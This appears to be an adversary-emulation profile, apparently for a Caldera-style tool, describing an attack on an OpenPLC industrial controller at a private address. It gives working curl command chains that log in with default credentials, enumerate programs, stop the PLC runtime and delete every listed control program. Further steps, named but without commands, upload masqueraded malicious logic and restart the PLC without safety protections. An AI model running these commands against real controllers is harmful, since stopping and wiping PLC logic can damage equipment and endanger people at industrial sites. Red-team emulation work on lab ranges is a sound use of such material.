ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.command: curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login" -d "username=openplc&password=openplc" -L -o /dev/null && echo "=== Runtime Status ===" && curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" | grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 && echo "=== Programs ===" && curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" | grep -oP '[0-9]+\.st' | sort -u && echo "PLC_MODE_DETECTED"
steps.plaintext_command: curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login" -d "username=openplc&password=openplc" -L -o /dev/null && echo "=== Runtime Status ===" && curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" | grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 && echo "=== Programs ===" && curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" | grep -oP '[0-9]+\.st' | sort -u && echo "PLC_MODE_DETECTED"
steps.description:
Query the OpenPLC web API to determine current runtime status
(running/stopped), active program name, and protocol states.
steps.name: OpenPLC - Detect Operating Mode via API

steps.command: curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/programs" -o /tmp/programs_page.html && echo "=== Programs Found ===" && grep -oP '[0-9]+\.st' /tmp/programs_page.html | sort -u && echo "=== Attempting direct download ===" && curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/programs" -o /tmp/plc_programs.html && wc -l /tmp/plc_programs.html && echo "PROGRAM_ENUMERATED"
steps.plaintext_command: curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/programs" -o /tmp/programs_page.html && echo "=== Programs Found ===" && grep -oP '[0-9]+\.st' /tmp/programs_page.html | sort -u && echo "=== Attempting direct download ===" && curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/programs" -o /tmp/plc_programs.html && wc -l /tmp/plc_programs.html && echo "PROGRAM_ENUMERATED"
steps.description:
Download the active program via the programs page.
The /get-program-body endpoint may not exist; use /programs page parsing.
steps.name: OpenPLC - Download Active Program

steps.command: curl -s -b /tmp/plc_cookies.txt -d "" "http://192.168.95.2:8080/stop_plc" -o /tmp/stop_result.html -w "%{http_code}" && echo "PLC_STOP_REQUESTED" && sleep 2 && curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/dashboard" -o /tmp/plc_status.html && grep -qi "stopped" /tmp/plc_status.html && echo "PLC_STOPPED" || echo "PLC_STOP_UNCERTAIN"
steps.plaintext_command: curl -s -b /tmp/plc_cookies.txt -d "" "http://192.168.95.2:8080/stop_plc" -o /tmp/stop_result.html -w "%{http_code}" && echo "PLC_STOP_REQUESTED" && sleep 2 && curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/dashboard" -o /tmp/plc_status.html && grep -qi "stopped" /tmp/plc_status.html && echo "PLC_STOPPED" || echo "PLC_STOP_UNCERTAIN"
steps.description: Stop the PLC runtime via the correct API endpoint
steps.name: OpenPLC - Change Operating Mode to STOP

steps.command: for prog in 326339.st 690525.st 655326.st blank_program.st; do  curl -s -b /tmp/plc_cookies.txt  -d "program_name=$prog"  "http://192.168.95.2:8080/remove-program"  -o /dev/null;  echo "DELETED: $prog";done && echo "ALL_PROGRAMS_DESTROYED"
steps.plaintext_command: for prog in 326339.st 690525.st 655326.st blank_program.st; do  curl -s -b /tmp/plc_cookies.txt  -d "program_name=$prog"  "http://192.168.95.2:8080/remove-program"  -o /dev/null;  echo "DELETED: $prog";done && echo "ALL_PROGRAMS_DESTROYED"
steps.description: Delete programs via the correct /remove-program endpoint.
steps.name: OpenPLC - Data Destruction of PLC Programs

steps.description: Upload malicious program named identically to legitimate one (326339.st)
steps.name: OpenPLC - Upload Masqueraded Malicious Logic

steps.description: Compile and start the PLC runtime
steps.name: OpenPLC - Start PLC with Uploaded Logic

steps.description: Read input registers from Tank device to observe pressure and liquid level
steps.name: Modbus - Read Tank Pressure and Level

adversary.name: PLC Mode Abuse and Data Destruction Adversary
adversary.description:
Advanced attack targeting PLC operating modes. Stops PLC, destroys
legitimate programs, uploads identically-named malicious logic
to masquerade as the original, then restarts PLC without safety
protections.

objectives.name: default
objectives.description: This is a default objective that runs forever.
